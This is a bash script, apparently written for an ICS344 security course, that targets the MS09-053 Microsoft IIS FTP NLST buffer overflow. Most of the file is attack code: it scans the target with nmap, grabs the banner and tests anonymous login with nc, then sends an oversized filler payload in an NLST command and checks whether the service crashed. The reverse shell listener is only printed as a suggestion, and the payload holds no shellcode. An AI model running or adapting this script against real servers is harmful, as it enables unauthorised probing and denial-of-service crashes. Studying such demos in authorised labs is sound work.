#!/bin/bash

if [ $# -lt 2 ]; then
    echo "Usage: $0 <target_ip> <attacker_ip>"
    exit 1
fi

TARGET_IP=$1
ATTACKER_IP=$2
PORT=${3:-21}
LISTENER_PORT=${4:-4444}

echo "[*] ICS344 FTP Exploitation Script"
echo "[*] Target: $TARGET_IP:$PORT | Attacker: $ATTACKER_IP:$LISTENER_PORT"

echo "[*] Checking FTP service..."
if ! nmap -p $PORT -T4 --open $TARGET_IP | grep -q "open"; then
    echo "[-] FTP service not found on target"
    exit 1
fi

echo "[*] Getting FTP banner..."
banner=$(echo -e "QUIT\r\n" | nc -w 3 $TARGET_IP $PORT 2>/dev/null | head -1)
echo "[+] Banner: $banner"

if echo "$banner" | grep -qi "Microsoft"; then
    echo "[+] Target appears to be running Microsoft FTP service"
    echo "[+] Service may be vulnerable to MS09-053"
else
    echo "[!] Target does not appear to be running Microsoft FTP service"
    echo "[!] Continuing anyway for demonstration purposes"
fi

echo "[*] Testing anonymous FTP access..."
anon_test=$(echo -e "USER anonymous\r\nPASS anonymous@example.com\r\nQUIT\r\n" | nc -w 5 $TARGET_IP $PORT 2>/dev/null)
if echo "$anon_test" | grep -q "230"; then
    echo "[+] Anonymous login successful"
else
    echo "[!] Anonymous login failed or unclear result"
    echo "[!] Continuing anyway for demonstration purposes"
fi

echo "[*] Generating exploit payload..."
PAYLOAD=$(python -c "print('A' * 256 + 'B' * 4 + 'C' * 128)")
echo "[+] Payload generated"

echo "[*] Setting up reverse shell listener..."
echo "[+] Listener would be started on $ATTACKER_IP:$LISTENER_PORT"
echo "[*] In a real scenario, you would run: nc -lvp $LISTENER_PORT"

echo "[*] Sending exploit to target..."
(
    echo "USER anonymous"
    sleep 1
    echo "PASS anonymous@example.com"
    sleep 1
    echo "NLST $PAYLOAD"
    sleep 2
    echo "QUIT"
) | nc -w 10 $TARGET_IP $PORT >/dev/null 2>&1

echo "[+] Exploit payload sent"
echo "[*] Checking target status..."

echo -e "QUIT\r\n" | nc -w 2 $TARGET_IP $PORT >/dev/null 2>&1
if [ $? -eq 0 ]; then
    echo "[!] Target service still appears to be running"
    echo "[!] In a real attack, the service might have crashed or execution would continue in a reverse shell"
else
    echo "[+] Target service appears to be unresponsive - possible successful crash"
fi

echo "[+] Exploitation demonstration completed"
echo "[+] PROOF OF CONCEPT:"
echo "--------------------------------------"
echo "| Vulnerability: MS09-053           |"
echo "| Target: $TARGET_IP:$PORT            |"
echo "| Service: Microsoft IIS FTP         |"
echo "| Attack: NLST Command Buffer Overflow|"
echo "| Status: Exploitation Demonstrated  |"
echo "--------------------------------------"

echo "[!] IMPORTANT: This script is for educational purposes only"
echo "[!] Use only in authorized environments as part of ICS344 coursework"

exit 0
